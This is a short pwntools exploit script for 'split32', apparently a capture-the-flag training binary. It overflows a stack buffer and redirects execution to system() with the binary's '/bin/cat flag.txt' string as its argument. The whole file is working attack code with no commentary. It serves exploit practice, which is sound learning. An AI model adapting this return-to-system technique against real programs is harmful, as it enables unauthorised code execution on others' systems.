from pwn import *
e = ELF("./split32")
system = p32(e.symbols["system"])
cat = p32(next(e.search("/bin/cat flag.txt")))
p = process("./split32")
print p.recv()
p.sendline("a"*44+system+"bbbb"+cat)
print p.recv()

p.interactive()
